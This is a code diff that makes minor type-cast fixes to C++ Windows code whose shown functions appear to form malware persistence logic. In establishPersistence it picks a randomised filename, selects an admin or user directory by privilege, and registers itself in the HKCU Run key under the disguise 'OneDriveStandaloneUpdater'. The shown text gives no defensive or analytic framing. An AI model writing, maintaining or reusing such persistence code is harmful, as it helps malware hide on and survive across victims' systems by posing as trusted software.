@@ -24,7 +24,7 @@ std::wstring getExecutablePath() {
     DWORD copied = 0;
     do {
         path_buf.resize(path_buf.size() + MAX_PATH);
-        copied = GetModuleFileNameW(NULL, path_buf.data(), path_buf.size());
+        copied = GetModuleFileNameW(NULL, path_buf.data(), static_cast<DWORD>(path_buf.size()));
     } while (copied >= path_buf.size());
     path_buf.resize(copied);
     return std::wstring(path_buf.begin(), path_buf.end());
@@ -44,7 +44,7 @@ void establishPersistence() {
 
     std::random_device rd;
     std::mt19937 gen(rd());
-    std::uniform_int_distribution<> distrib(0, dynamicNames.size() - 1);
+    std::uniform_int_distribution<> distrib(0, static_cast<int>(dynamicNames.size() - 1));
     const wchar_t* persistFilename = dynamicNames[distrib(gen)];
 
     const wchar_t* persistDir = isAdmin() ? adminPath : userPath;
@@ -76,7 +76,7 @@ void establishPersistence() {
         // Use registry run key
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExW(hKey, L"OneDriveStandaloneUpdater", 0, REG_SZ, (const BYTE*)persistPath.c_str(), (persistPath.size() + 1) * sizeof(wchar_t));
+            RegSetValueExW(hKey, L"OneDriveStandaloneUpdater", 0, REG_SZ, (const BYTE*)persistPath.c_str(), static_cast<DWORD>((persistPath.size() + 1) * sizeof(wchar_t)));
             RegCloseKey(hKey);
         }
     }
